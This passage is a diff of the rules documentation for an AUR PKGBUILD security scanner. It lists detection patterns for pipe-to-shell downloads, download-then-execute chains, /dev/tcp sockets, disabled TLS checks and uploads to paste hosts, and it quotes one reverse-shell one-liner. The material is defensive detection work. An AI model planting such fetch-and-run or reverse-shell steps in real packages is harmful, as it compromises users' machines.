@@ -72,6 +72,7 @@ severity weights and the reserved identifier ranges.
 - **Target:** `resolved`
 - **Severity:** CRITICAL (weight 40)
 - **Category:** `network_execution`
+
 - **Pattern:** `curl.*(?<!\\)\|\s*(?:[({]\s*(?:(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+))?(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+)(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:source|\.)\s+/dev/stdin\b)`
 - **Description:** Detects `curl | bash`, `curl | sh`, and variants including `python`, `zsh`, `dash`, `busybox sh`, and `source /dev/stdin`. This is the most common careless malice pattern in AUR PKGBUILDs: downloading a script and piping it directly to a shell without verification.
 - **Note:** The lookbehind requires the pipe to be **unescaped**. `curl x \| sh` passes a literal bar to `curl` as an argument and starts   no pipeline, so it is not a match. The tokenizer preserves the escape (`tokenizer._ESCAPE_REMOVABLE`) so the distinction survives resolution. A `rules.toml` written by an earlier release may hold a wider pattern that does match it; [`trustsight config sync-rules --update`](../cli.md#sync-rules) replaces patterns this project shipped previously.
@@ -82,6 +83,7 @@ severity weights and the reserved identifier ranges.
 - **Target:** `resolved`
 - **Severity:** CRITICAL (weight 40)
 - **Category:** `network_execution`
+
 - **Pattern:** `wget.*(?<!\\)\|\s*(?:[({]\s*(?:(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+))?(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:(?:env|exec|command|sudo|doas|nohup|setsid|nice|ionice|stdbuf|timeout|unbuffer|script)(?:\s+-[-\w]+)*(?:\s+\d+[smhd]?)?\s+|(?:xterm|u?rxvt|konsole|gnome-terminal|alacritty|kitty|wezterm|foot|terminator|xfce4-terminal|lxterminal|tilix|ttyd|zellij|chroot|bwrap|firejail|nsjail|unshare|proot|fakeroot|fakechroot|systemd-nspawn|toolbox|distrobox-enter|screen|dtach|abduco|runuser|setpriv|nohup)(?:\s+[^\s;&|]+){0,4}\s+)(?:/(?:usr/)?bin/)?(?:(?:ba|z|da|k|mk|pdk|ya|po|a)?sh|busybox\s+(?:ash|sh)|python3?|perl|ruby|node|php|lua(?:jit)?|tclsh|wish|fish|tcsh|csh|rc|es|elvish|xonsh|nu|osh)\b|(?:source|\.)\s+/dev/stdin\b)`
 - **Description:** Same as R001 but for `wget`. Separate rule per tool to allow per-tool tuning.
 - **Note:** The pipe must be **unescaped**. An escaped bar is an argument to the command and starts   no pipeline, so it is not a match. The tokenizer preserves the escape (`tokenizer._ESCAPE_REMOVABLE`) so the distinction survives resolution. A `rules.toml` written by an earlier release may hold a wider pattern that does match it; [`trustsight config sync-rules --update`](../cli.md#sync-rules) replaces patterns this project shipped previously.
@@ -92,6 +94,7 @@ severity weights and the reserved identifier ranges.
 - **Target:** programmatic (diff-aware)
 - **Severity:** LOW (weight 5)
 - **Category:** `integrity`
+
 - **Condition:** An added `http://` source URL has no added or changed checksum array.
 - **Description:** Plain HTTP permits a network attacker to replace a download in transit. Adding a checksum in the same diff supplies checksum backing and suppresses this rule; `sha256sums=('SKIP')` does not. The rule is intentionally about transport without newly declared integrity backing, not about pipes or archive suffixes.
 
@@ -100,6 +103,7 @@ severity weights and the reserved identifier ranges.
 - **Target:** `resolved`
 - **Severity:** HIGH (weight 25)
 - **Category:** `network_execution`
+
 - **Pattern:** `\b(python|ruby|perl)\s+-c\s+https?://`
 - **Description:** Detects language runtimes downloading scripts from URLs: `python -c <url>`, `ruby -c <url>`, `perl -c <url>`. An unusual pattern that indicates a runtime fetching and executing code from a remote server.
 
@@ -108,6 +112,7 @@ severity weights and the reserved identifier ranges.
 - **Target:** programmatic (`analysis/build.py`)
 - **Severity:** CRITICAL (weight 40)
 - **Category:** `privilege`
+
 - **Condition:** `sudo`, `doas`, `pkexec` or `run0` at a command position: line start, after `;`/`&&`/`||`/`|`, or inside `$(...)`, with or without arguments.
 - **Description:** Detects a privilege tool that is *executed* rather than mentioned. Command position is what separates the two: `groups=('sudo')`, an `optdepends` name, and `echo "sudo required"` place the word at an argument position and stay quiet, while `echo "x"; sudo ...` is an execution context and fires. Naming `doas`, `pkexec` and `run0` as well as `sudo` tests what the recipe does rather than which tool its author preferred.
 
@@ -116,6 +121,7 @@ severity weights and the reserved identifier ranges.
 - **Target:** `raw_line`
 - **Severity:** LOW (weight 5)
 - **Category:** `network_usage`
+
 - **Pattern:** `\bcurl\s`
 - **Scope:** `["function_body"]` only
 - **Description:** Detects `curl` commands inside function bodies. Does not fire in comments or messages. Low severity because curl is a legitimate build tool; the presence alone is not suspicious, but combined with other signals it adds context.
@@ -125,6 +131,7 @@ severity weights and the reserved identifier ranges.
 - **Target:** `raw_line`
 - **Severity:** LOW (weight 5)
 - **Category:** `network_usage`
+
 - **Pattern:** `\bwget\s`
 - **Scope:** `["function_body"]` only
 - **Description:** Same rationale as R010 but for `wget`. Separate rule per tool.
@@ -144,6 +151,7 @@ code emits it; it is held alongside [H009](#h009) for a future runtime probe.
 ### C007: Command Substitution In Source Array {#c007}
 
 - **Severity:** CRITICAL (weight 40)
+
 - **Condition:** An added `source=()` line contains `$(...)` or a backtick expression.
 - **Description:** The source array is data, evaluated when the PKGBUILD is parsed. A command substitution there executes *before* any build function runs, and before any rule that inspects `build()` has anything to look at.
 
@@ -152,6 +160,7 @@ code emits it; it is held alongside [H009](#h009) for a future runtime probe.
 - **Target:** `resolved`
 - **Severity:** CRITICAL (weight 40)
 - **Category:** `network_execution`
+
 - **Pattern:** `/dev/(?:tcp|udp)/|/dev/[a-z]*[?*\[][a-z?*\]\[]*/|/dev/\$\{?\w+\}?/`
 - **Description:** Bash's `/dev/tcp` and `/dev/udp` pseudo-devices open network sockets with no external binary. The canonical reverse shell is `bash -i >& /dev/tcp/host/port 0>&1`. Matching the bare path rather than a redirection operator covers the `>&` and `exec 3<>` forms alike.
 
@@ -160,6 +169,7 @@ code emits it; it is held alongside [H009](#h009) for a future runtime probe.
 - **Target:** `resolved`
 - **Severity:** CRITICAL (weight 40)
 - **Category:** `execution`
+
 - **Pattern:** `(?:curl|wget)\s+[^;&|]*-o\s*\S+[^;&|]*(?:&&|;)\s*(?:chmod\s+\+x[^;&|]*(?:&&|;)\s*)?(?:\./|/tmp/|bash\s|sh\s)`
 - **Description:** Detects the download-then-run chain: fetch to a path, optionally `chmod +x`, then execute it. Each step alone is unremarkable; the sequence is not.
 
@@ -168,6 +178,7 @@ code emits it; it is held alongside [H009](#h009) for a future runtime probe.
 - **Target:** `resolved`
 - **Severity:** HIGH (weight 25)
 - **Category:** `network_execution`
+
 - **Pattern:** `\b(?:python3?|perl|ruby)\s+-e\s+.*(?:socket|urllib|urlopen|Net::|LWP|open-uri|https?://)`
 - **Description:** Detects an interpreter one-liner (`-e`) that references network APIs (`socket`, `urllib`, `LWP`, `Net::`) or an inline URL.
 
@@ -176,6 +187,7 @@ code emits it; it is held alongside [H009](#h009) for a future runtime probe.
 - **Target:** `raw_line`
 - **Severity:** MEDIUM (weight 15)
 - **Category:** `network`
+
 - **Pattern:** `https?://(?!(?:127\.|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|169\.254\.|0\.0\.0\.0))\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}`
 - **Description:** A source URL pointing at a bare IP address bypasses DNS and any domain reputation the bucket classifier could apply. Loopback and private addresses are excluded: they distribute nothing, so a local URL a recipe only prints is not a source. A line that only prints text (`echo`/`printf`/`cat`) is excluded for the same reason.
 
@@ -184,6 +196,7 @@ code emits it; it is held alongside [H009](#h009) for a future runtime probe.
 - **Target:** `raw_line`
 - **Severity:** LOW (weight 5)
 - **Category:** `network`
+
 - **Pattern:** `https?://(?!(?:127\.|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|169\.254\.|0\.0\.0\.0))[^/\s:]+:(?!(?:80|443|8080|8443)(?:[/\s"\x27]|$))\d{2,5}`
 - **Description:** A source URL on a port other than 80, 443, 8080, or 8443. Unusual ports suggest a service that is not a conventional distribution host. Loopback and private addresses, and lines that only print text, are excluded, as for R046.
 
@@ -192,6 +205,7 @@ code emits it; it is held alongside [H009](#h009) for a future runtime probe.
 - **Target:** `raw_line`
 - **Severity:** LOW (weight 5)
 - **Category:** `network`
+
 - **Pattern:** `https?://[^/\s]*\.(?:tk|ml|ga|cf|gq|pw)(?:[:/]|["\x27\s)]|$)`
 - **Description:** A source URL on a free-registrar TLD (`.tk`, `.ml`, `.ga`, `.cf`, `.gq`, `.pw`). These carry no registration cost and are disproportionately used for throwaway infrastructure. Deliberately excludes `.xyz` and `.top`, which have substantial legitimate use.
 
@@ -200,6 +214,7 @@ code emits it; it is held alongside [H009](#h009) for a future runtime probe.
 - **Target:** `raw_line`
 - **Severity:** MEDIUM (weight 15)
 - **Category:** `network`
+
 - **Pattern:** `https?://[^/\s]*\.(?:duckdns\.org|no\-ip\.org|noip\.com|no\-ip\.biz|ddns\.net|hopto\.org|zapto\.org|sytes\.net|dynu\.com|dynv6\.net|afraid\.org|changeip\.com|dyndns\.org|ngrok\.io|ngrok\.app|ngrok\-free\.app|trycloudflare\.com|localtunnel\.me|loca\.lt|serveo\.net|bore\.pub|pinggy\.io|localhost\.run|lhr\.life|pagekite\.me|portmap\.io|pages\.dev|workers\.dev|r2\.dev|github\.io|gitlab\.io|codeberg\.page|vercel\.app|netlify\.app|web\.app|firebaseapp\.com|surge\.sh|render\.com|onrender\.com|glitch\.me|replit\.dev|herokuapp\.com|deno\.dev|railway\.app)(?:[:/]|["\x27\s)]|$)`
 - **Description:** A source URL hosted on a free-hosting, dynamic-DNS or tunnelling provider. Naming one of these costs nothing and leaving it costs nothing, so a source served from here is a claim a reviewer has to judge rather than an upstream distribution channel. The list is split into dynamic DNS (`duckdns.org`, `no-ip.org`, ...), tunnels (`ngrok-free.app`, `trycloudflare.com`, ...) and free/static hosting (`pages.dev`, `github.io`, `vercel.app`, ...). The free-hosting group is the tunable one: small projects do occasionally publish release assets there, so it is the first thing to trim in `hosts.toml free_hosting_domains` if it misfires. The leading `\.` makes this a subdomain match, so `duckdns.org.evil.com` does not fire.
 
@@ -208,6 +223,7 @@ code emits it; it is held alongside [H009](#h009) for a future runtime probe.
 - **Target:** `raw_line`
 - **Severity:** HIGH (weight 25)
 - **Category:** `packaging`
+
 - **Scope:** `['pkgver']`
 - **Pattern:** `\b(?:curl|wget2?|aria2c|axel|lftp|ncftp(?:get)?|snarf|httpie|elinks|links2?|w3m|lynx|browsh|scp|sftp|rsync|ftp|tftp|ssh(?=\s+(?:-\S+\s+)*[\w.@-]+\s+\S)|nc|ncat|netcat|socat|telnet|fetch(?!\()|openssl\s+s_client|dig|host|nslookup|drill|kdig|git(?:\s+(?:-C\s*\S+|-c\s*\S+|--\S+))*\s+(?:clone|fetch|pull|ls-remote|archive)|svn\s+(?:co|checkout|export)|hg\s+(?:clone|pull|unbundle)|bzr\s+(?:branch|pull|export)|darcs\s+get|fossil\s+clone|cvs\s+(?:[-:]\S+\s+)*(?:co|checkout|export)|s3cmd(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+(?:get|sync|cp)|aws\s+s3(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+(?:cp|sync|mv)|aws\s+s3api(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+get-object|gsutil(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+(?:cp|rsync)|az(?:copy)?(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+(?:storage\s+blob\s+download|copy)|rclone(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+(?:copy|sync|cat|copyto|copyurl|moveto|move|bisync)|ipfs(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+(?:get|cat|dag\s+get)|swift(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+download|rados(?:\s+(?:--[^\s;&|]+|-[^-\s;&|][^\s;&|]*))*(?:\s+[^-\s;&|][^\s;&|]*)*\s+get|git(?:\s+(?:-C\s*\S+|-c\s*\S+|--\S+))*\s+lfs\s+(?:pull|fetch|checkout)|yt-dlp|youtube-dl|transmission-cli|aria2c(?=\s+[^\n;&|]*magnet:)|b2\s+download-file|b2\s+download\b|restic\s+restore|borg\s+extract|lwp-request|lwp-download|npx|git(?:\s+(?:-C\s*\S+|-c\s*\S+|--\S+))*\s+push|fetch(?=\s+[^\n;&|]*\b(?:https?|ftps?)://))\b`
 - **Description:** `pkgver()` runs during version resolution, before a reviewer sees the build. Network access there executes ahead of any inspection step. Scoped to `pkgver` so that `curl` in `build()` is unaffected, and matched against fetching subcommands only; `git describe`, the standard VCS idiom, is local and must not fire.
@@ -218,6 +234,7 @@ code emits it; it is held alongside [H009](#h009) for a future runtime probe.
 - **Target:** `resolved`
 - **Severity:** MEDIUM (weight 15)
 - **Category:** `source`
+
 - **Pattern:** `git\s+clone\s+[^;&|]*(?:--branch|-b)\s+\$\{?[a-zA-Z_]`
 - **Description:** A `git clone --branch $var` resolves at build time to whatever the variable holds, so the pinned ref is not actually pinned.
 
@@ -226,6 +243,7 @@ code emits it; it is held alongside [H009](#h009) for a future runtime probe.
 - **Target:** `resolved`
 - **Severity:** CRITICAL (weight 40)
 - **Category:** `execution`
+
 - **Pattern:** `(?:curl|wget)\s+[^;&|]*-o\s*\S+[^;&|]*(?:&&|;)\s*(?:source|\.)\s`
 - **Description:** Detects a download followed by `source` or `.`, which executes the fetched file in the current shell.
 
@@ -234,6 +252,7 @@ code emits it; it is held alongside [H009](#h009) for a future runtime probe.
 - **Target:** `resolved`
 - **Severity:** HIGH (weight 25)
 - **Category:** `network`
+
 - **Pattern:** `(?:curl\s+[^;&|]*?(?:--insecure|-k)\b|wget\s+[^;&|]*?--no-check-certificate\b|git\s+-c\s+http\.sslVerify=false\b|GIT_SSL_NO_VERIFY\s*=|pip\s+[^;&|]*?--trusted-host\b|npm\s+[^;&|]*?--strict-ssl=false\b|deno\s+[^;&|]*?--unsafely-ignore-certificate-errors\b|NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*["\x27]?0\b)`
 - **Description:** Detects the documented TLS-off flag of every catalogued client: `curl --insecure`/`-k`, `wget --no-check-certificate`, `git -c http.sslVerify=false`, `pip --trusted-host`, `npm --strict-ssl=false` and `deno --unsafely-ignore-certificate-errors`, plus the `GIT_SSL_NO_VERIFY` and `NODE_TLS_REJECT_UNAUTHORIZED=0` environment assignments. Disabling certificate verification makes the transport trivially interceptable. The `-k` match requires a preceding word boundary so that flags such as `--keepalive-time` do not trigger it. `--no-verify` is deliberately absent: for bun and cargo it skips lifecycle scripts, not TLS; bun/node disable TLS through the Node compatibility variable instead, and cargo's transport is git (`http.sslVerify`), already covered.
 
@@ -242,6 +261,7 @@ code emits it; it is held alongside [H009](#h009) for a future runtime probe.
 - **Target:** programmatic (diff-aware, defined in `src/trustsight/analysis/build.py`)
 - **Severity:** INFO (weight 0)
 - **Category:** `build`
+
 - **Description:** The diff changes any line inside `build()`, `prepare()`, `check()`, or `package()`. Many supply-chain attacks add a single line to one of these functions, so this reports that an executing function was altered.
 
 **INFO, so it contributes nothing to the score.** It fires on 19.7 % of benign diffs because maintainers rewrite build functions routinely, and no narrowing reaches triage quality. Carrying weight it would simply add points to one benign update in five.
@@ -257,6 +277,7 @@ On by default. See [`[code_rules]`](../configuration.md#code_rules).
 - **Target:** programmatic (resolved command lines)
 - **Severity:** HIGH (weight 25)
 - **Category:** `network`
+
 - **Description:** A command inside `build()`, `prepare()`, `check()`, or `package()` downloads a URL that does not appear in `source=()`. This is the classic route around checksum verification: the declared sources verify cleanly while the real payload arrives at compile time.
 
 The comparison is against a **source-array-scoped** URL extraction, not the general `extract_urls_from_diff()`. That helper collects URLs from any added line, including the offending `curl` line itself, so comparing against it would mean the rule could never fire. A fetch of a URL already declared in `source=()` does not fire.
@@ -270,6 +291,7 @@ On by default. See [`[code_rules]`](../configuration.md#code_rules).
 - **Target:** programmatic (`analysis/network.py`)
 - **Severity:** MEDIUM (weight 15)
 - **Category:** `network`
+
 - **Condition:** `pkgver` or `_pkgver` is assigned a literal containing characters outside `[A-Za-z0-9._+-]`, and that variable is interpolated (braced or bare) into a source URL.
 
 Both halves are required. An unsafe version string that is never interpolated
@@ -284,6 +306,7 @@ Fire rate: 1 of 3739 (0.03 %).
 - **Target:** programmatic (`analysis/network.py`)
 - **Severity:** MEDIUM (weight 15)
 - **Category:** `network`
+
 - **Condition:** A `source=` entry uses a scheme outside the `[hosts] source_schemes` allowlist. The base of a `transport+base` token is what is judged, so `git+https://` is read as `https`.
 
 `data:` URIs carry no `://` and are not scheme tokens, which is an accepted
@@ -296,6 +319,7 @@ Fire rate: 7 of 3739 (0.19 %).
 - **Target:** programmatic (`analysis/network.py`)
 - **Severity:** HIGH (weight 25)
 - **Category:** `exfil`
+
 - **Condition:** A build or install function invokes `curl`/`wget` with a request body (an upload flag from `[patterns] upload_flags`) against a host in `[hosts] paste_hosts`.
 
 Direction is the entire rule. The same host list also feeds the
@@ -323,6 +347,7 @@ download in `gamescope-nvidia`, which stays H016's.
 - **Target:** programmatic (`analysis/network.py`)
 - **Severity:** HIGH (weight 25)
 - **Category:** `network`
+
 - **Condition:** An added line references a `.onion`/`.i2p` host, issues a DNS-over-HTTPS query or names a configured DoH endpoint, or invokes a tunnelling client (`torsocks`, `socat`, `ngrok`, `chisel`, `frpc`, ...) at a command position inside a build or install function.
 
 The command-position anchor is what separates use from mention: a client named
@@ -335,6 +360,7 @@ Fire rate: 0 of 3739.
 - **Target:** programmatic (`analysis/network.py`)
 - **Severity:** HIGH (weight 25)
 - **Category:** `network`
+
 - **Condition:** A network client from `[patterns] parse_time_fetch` runs at a command position **outside every function**, in the PKGBUILD or an install file.
 
 Everything at the top level executes as soon as makepkg sources the recipe,
@@ -359,6 +385,7 @@ refresh.
 
 - **Severity:** HIGH (weight 25)
 - **Category:** `execution`
+
 - **Condition:** Text on an added line (base64, hex, uuencode, or an H065 reconstruction) decodes to bytes carrying ELF, shebang, PE or Mach-O magic.
 
 This is a type check on the decoder's output, which is why one rule covers
@@ -371,6 +398,7 @@ Fire rate: 0 of 3739.
 
 - **Severity:** HIGH (weight 25)
 - **Category:** `execution`
+
 - **Condition:** A heredoc, `printf` or `cat >` writes a script or source file that the same function then compiles or executes.
 
 Writing a config file, a `.desktop` entry or a patch that a declared build step
@@ -382,6 +410,7 @@ Fire rate: 0 of 3739.
 
 - **Severity:** HIGH (weight 25)
 - **Category:** `execution`
+
 - **Condition:** A path the recipe writes is then executed by the same function.
 
 The execution side counts interpreters, `source`, `.`, compilers and a plain
@@ -395,6 +424,7 @@ Fire rate: 0 of 3739.
 
 - **Severity:** CRITICAL (weight 40)
 - **Category:** `execution`
+
 - **Condition:** A fetched script reaches a shell by a path the pipe-to-shell rules do not see: process substitution (`bash <(curl ...)`), `xargs` (`curl ... | xargs bash`), or a here-string fed by command substitution (`bash <<< "$(curl ...)"`). The finding is named `Remote Script Via Process Substitution`, `Remote Script Via xargs`, or `Remote Script Via Here-String` according to the path matched.
 
 Each still executes remote code at build time, so it belongs with R001/R002
@@ -404,6 +434,7 @@ rather than at R010/R011's "uses curl" LOW.
 
 - **Severity:** HIGH (weight 25)
 - **Category:** `execution`
+
 - **Condition:** An executed path is not a declared `source=()` basename, not a file the recipe wrote earlier in the same function, and not an H072-exempt build artifact, and either the path references `${startdir}`/`$startdir` or walks `../`, or the executed basename is present in the repository tree manifest under a relative path. A build tool (`make`, `cmake`, `ninja`, `meson`) whose *implicit* input file is in the manifest and undeclared counts as executing it.
 
 H069/H072 own files the recipe itself writes; H066 owns committed ELF
@@ -435,6 +466,7 @@ them. Detected by `_committed_execution_findings()` in
 
 - **Severity:** CRITICAL (weight 40)
 - **Category:** `network_execution`
+
 - **Condition:** Inside a build/package/check/prepare function (install hooks already have H017), a line downloads to a file with `curl`/`wget`/`aria2c`/`axel` (`-o`, `--output`, `--output-document`, glued or spaced, a `>` redirect, or a stdout-dash piped to `tee`), or with an interpreter one-liner (`python3 -c ... urlretrieve`, `perl -e ... getstore`, and the rest), and the same scope later executes that file. "The same scope" follows the call graph: a fetch in a helper and the execution in the `build()` that calls it are one operation.
 
 The **unattributed arm** covers the clients whose output grammar names no file: `sftp`/`ftp`/`ssh`/`nc`, `git fetch`/`pull`, `rclone moveto`/`move`/`bisync`/`copyurl`, `ipfs get`, `aws s3 cp`, `gsutil cp`, `b2 download`, `cvs`, `tftp`, `openssl s_client`, `npx`, a glued or server-decided flag, and a fetch-spec-in-file (`wget -i`, `aria2c -i`, `lftp -f`, `curl --config`). A later execution of an undeclared, non-benign file in the same reachable scope pairs with it; pairing crosses makepkg phases in order (`prepare` -> `build` -> `check` -> `package`), treats a loop variable (`bash "$f"`) as an unknown path, and follows a rename of a fetched file (`awk '1' repo/x.sh > run.me; escript run.me`). Executions under `$pkgdir` are the package's own output and are exempt. A scheme-bearing URL is left to H016 and the attributed arm, so one command is not scored twice.
@@ -459,6 +491,7 @@ Detected by `_fetch_then_execute_findings()` in
 
 - **Severity:** HIGH (weight 25)
 - **Category:** `execution`
+
 - **Condition:** An interpreter (`bash`/`sh`/`zsh`/`dash`/`ksh`/`python`/`perl`/`ruby`), `source`, `.` or `./` form executes a file whose basename is declared in the `source=()` array.
 
 Checksums protect integrity, not intent: a `source=(... stage.sh)` followed by
@@ -474,6 +507,7 @@ same reason. Detected by `edge_source_file_execution()` in
 
 - **Severity:** CRITICAL (weight 40)
 - **Category:** `delivery`
+
 - **Condition:** A committed `.service`, `.socket`, `.timer`, `.path`,
   `.mount`, `.automount`, `.target`, `.desktop`, `.rules`, `.conf`, `.cfg`,
   `.ini`, `.install`, `.hook`, `.patch` or `.diff`, or a build manifest
@@ -518,6 +552,7 @@ partial read.
 
 - **Severity:** HIGH (weight 25)
 - **Category:** `execution`
+
 - **Condition:** The W001 observable - a script neither declared nor
   committed - executed inside `package()` or an install hook.
 
@@ -538,6 +573,7 @@ Zero occurrences in the benign corpus.
 
 - **Severity:** HIGH (weight 25)
 - **Category:** `network`
+
 - **Condition:** A fetch client at a command position in the `package()`
   body. Sources belong in `prepare`/`build`, where the checksum arrays
   apply; fetching at artifact-assembly time bypasses source-array
@@ -553,6 +589,7 @@ scheme-bearing address on the line. Measured on the locked benign corpus:
 
 - **Severity:** HIGH (weight 25)
 - **Category:** `execution`
+
 - **Condition:** An interpreter or explicit shell (`bash -c`, `sh`,
   `python`, `perl`, `ruby`, `node`, `php`) at a command position inside a
   `*_install`/`*_upgrade`/`*_remove` hook body. The hook runs as root at
